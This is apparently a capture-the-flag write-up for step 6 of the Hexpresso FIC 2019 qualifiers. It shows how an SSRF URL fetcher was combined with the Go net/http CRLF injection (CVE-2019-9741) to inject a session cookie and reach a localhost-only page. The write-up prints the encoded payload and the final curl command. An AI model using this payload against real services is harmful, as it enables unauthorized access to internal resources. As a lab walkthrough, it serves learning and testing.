---
title: Hexpresso FIC Quals 2019: Step 6
slug: hexpresso-fic-6
date: 20/12/2019 06
---

The sixth step is a WEB application that allows us to fetch an URL.

![Introduction](/assets/hexpresso-fic-quals/step6/intro.png)

In the source code of the page we can read:

```html
<div class="col s12">
    <!-- <span>PS: To get your flag go here: <a href="/secret">/secret</a></span> -->
</div>
```

So, our objective is to access `/secret`. Let's see:

![Secret](/assets/hexpresso-fic-quals/step6/secret.png)

Coming from `127.0.0.1` should not be a big deal using the URL fetcher
itself, right? This challenge really looks like a standard SSRF anyways...

![Not so easy](/assets/hexpresso-fic-quals/step6/not_so_easy.png)

*Note: we must add a GET parameter because the script appends
`:80/` at the end of the URL. We could deal with it but its more convenient
to totally absorb it.*

It seems that `0.0.0.0` is reachable. We should now be coming from `127.0.0.1`
but there is something else. We are missing the `GOSESSION` cookie.

I tried to trick the applicaion for some time but the problem is clear: we
have to control the body of the query that the URL fetcher performs in order to
add the cookie.

At this point, I was very sad and did not know what to do. I was about to
give up when my teammate [Plean](https://twitter.com/plean702) sent me
[this link](https://github.com/golang/go/issues/30794).

[CVE-2019-9741](https://nvd.nist.gov/vuln/detail/CVE-2019-9741) is a CRFL
injection, in the `net/http` package of Go (version 1.11). It is exactly
what we need as it allows to write the body of the query.

I tweaked the example payload of the GitHub (see the link above) issue and
came up with this:

```
0.0.0.0/secret?b%3d%20HTTP/1.1%0d%0aCookie:%20GOSESSION%3dabc
```

A bit more readble:

```
0.0.0.0/secret?b= HTTP/1.1\r
Cookie: GOSESSION=abc
```

The original body will still be present, after ours, but it does not matter.

Because we have to deal with CRLFs, it is easier to urlencode the payload.
However, the URL fetcher interface does not handle it well. We can use `curl`
instead:

Final command:

```
$ curl 'http://c4ffddcc437c5df3e6d681e7cafab510.hexpresso.fr/host?host=0.0.0.0/secret?b%3d%20HTTP/1.1%0d%0aCookie:%20GOSESSION%3dabc%0d%0aSHIT:%20123' | jq -r ".content" | base64 -D
{"ok":true,"message":"Ok here is your flag ...","flag":"Gg ! Send mail here 9ca37832b9fb80-penultimate-stage@hexpresso.fr ! But there is one last step here for the brave available on : https://ctf.hexpresso.fr/219058289d8699adc0b119374c2fc5bc"}
```

I took a break at this point but my teammate Shiro continued on step 7. Please,
take a look at [his writeup](https://github.com/Pycatchown/writeUps/blob/master/FIC/step7/wu_step7.md).
